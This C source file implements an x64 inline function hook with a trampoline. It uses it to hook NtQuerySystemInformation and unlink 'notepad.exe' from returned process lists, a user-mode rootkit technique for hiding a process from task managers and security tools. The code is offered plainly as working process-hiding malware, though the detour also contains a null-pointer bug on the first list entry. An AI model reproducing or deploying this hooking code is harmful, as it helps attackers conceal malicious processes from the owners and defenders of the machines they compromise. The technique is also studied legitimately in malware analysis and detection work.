#include "hook.h"

extern hookInfo g_NtQuerySysInfoHook;

void Tramp64(void* pTarget, void* pDetour, void** ppTrampoline, unsigned int len, unsigned char* backupBytes)
{
    int MinLen = 14;

    if (len < MinLen) return;

    BYTE jmpStub[] = {
            0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // jmp qword ptr [$+6]
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // ptr
    };

    BYTE* jmpStubAddress = (jmpStub+6);
    SIZE_T x64bitAddress = 8;

    memcpy(backupBytes,pTarget,len); //Save function prologue to unhook later

    //Allocate RWX page for trampoline function
    void* pTrampoline = VirtualAlloc(0, len + sizeof(jmpStub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    DWORD dwOld = 0;
    //Set original function page to RWX
    VirtualProtect(pTarget, len, PAGE_EXECUTE_READWRITE, &dwOld);


    //Calculate address after jmp stub
    void* afterJmp = pTarget + len;

    //Setup trampoline function
    memcpy(jmpStubAddress, &afterJmp, x64bitAddress); //Write address of where trampoline will jump to in original function into jmp stub
    memcpy(pTrampoline, pTarget, len);// Copy function prologue to trampoline function
    memcpy(pTrampoline + len, jmpStub, sizeof(jmpStub)); //Write jmp to allow us to jump to original function


    //Hook original function
    memcpy(jmpStubAddress, &pDetour, x64bitAddress); //Write address of detour function
    memcpy(pTarget, jmpStub, sizeof(jmpStub)); //Write jmp stub to jump to our hkFunction


    for (int i = MinLen; i < len; i++)
    {
        //minLen may not equal len, thus nop the extra bytes incase its junk
        *(BYTE*)(pTarget + i) = 0x90; //nop
    }
    
    VirtualProtect(pTarget, len, dwOld, &dwOld);//Restore page permissions
    *ppTrampoline = pTrampoline; //Save trampoline function address
}

void restore(void* pTarget, unsigned char* backupBytes, unsigned int len)
{
    DWORD oldProtect;
    //Set page RWX
    VirtualProtect(pTarget, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
    //Write original function prologue
    memcpy(pTarget,backupBytes,len);
    //Restore page permissions
    VirtualProtect(pTarget, 0x1000, oldProtect, &oldProtect);
}

NTSTATUS hkNtQuerySystemInfo(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID
SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{

    NtQuerySystemInfoFunc trampFunc = (NtQuerySystemInfoFunc)g_NtQuerySysInfoHook.trampFunc;

    NTSTATUS Result = trampFunc(SystemInformationClass,
    SystemInformation, SystemInformationLength, ReturnLength);
    
    if(NT_SUCCESS(Result) && SystemInformationClass == SystemProcessInformation)
    {
        PSYSTEM_PROCESS_INFORMATION pSystemProcess = NULL;
        PSYSTEM_PROCESS_INFORMATION pNextSystemProcess = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

        while (pNextSystemProcess->NextEntryOffset)
        {
            if (!lstrcmpW((&pNextSystemProcess->ImageName)->Buffer, L"notepad.exe"))
            {
                //Found name of process we wish to hide, skip it and null memory
                pSystemProcess->NextEntryOffset += pNextSystemProcess->NextEntryOffset;
                memset(pNextSystemProcess,0,pNextSystemProcess->NextEntryOffset);
            }
            pSystemProcess = pNextSystemProcess;
            pNextSystemProcess = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pSystemProcess + pSystemProcess->NextEntryOffset);
        }
        
    }
    return Result;
}
